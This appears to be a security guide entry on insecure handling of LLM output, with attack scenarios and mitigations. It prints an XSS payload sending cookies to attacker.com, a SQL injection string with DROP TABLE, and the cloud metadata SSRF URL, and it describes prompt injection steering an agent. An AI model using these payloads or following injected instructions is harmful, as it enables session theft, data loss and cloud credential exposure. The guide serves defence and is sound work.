# LLM02: Insecure Output Handling

## Description

Insecure Output Handling refers to insufficient validation, sanitisation, or
treatment of outputs generated by LLMs before they are passed to downstream
components or systems. Because LLM-generated content is dynamic and user-influenced,
it must be treated as untrusted input when used in any downstream context.

## Attack Scenarios

### Cross-Site Scripting (XSS) via LLM Output
An LLM summarizes a webpage that contains:
```
<script>document.cookie='stolen='+document.cookie+'&url=http://attacker.com'</script>
```
If the LLM's summary is rendered without sanitisation, the script executes in the
user's browser.

### Code Injection
An LLM generates SQL or shell commands based on user input:
```
User: "Show me notes about 'project; DROP TABLE notes;--'"
```
If the query is passed unsanitised to a database, this causes data destruction.

### Server-Side Request Forgery (SSRF)
An LLM agent given tool access to make HTTP requests may be induced (via prompt
injection + insecure output handling) to call internal metadata URLs such as
`http://169.254.169.254/latest/meta-data/` in cloud environments.

## Mitigations

1. **Treat LLM output as untrusted content** at all times, regardless of how
   constrained the system prompt appears.
2. **HTML-encode or sanitise** all LLM-generated content before rendering in a browser.
3. **Parameterise database queries** — never interpolate LLM output directly into SQL.
4. **Validate structured outputs** against a strict schema (JSON Schema, Pydantic).
5. **Disallow dangerous function calls** in agent tool sets; review what actions
   an LLM can trigger automatically.

## Relationship to Other Risks

Insecure output handling is often the consequence of a successful **LLM01 Prompt
Injection** attack: the attacker crafts input that causes the LLM to generate
malicious output, which is then passed to another system unsanitised.

**Risk Rating**: Likelihood: Medium | Impact: High | Overall: High
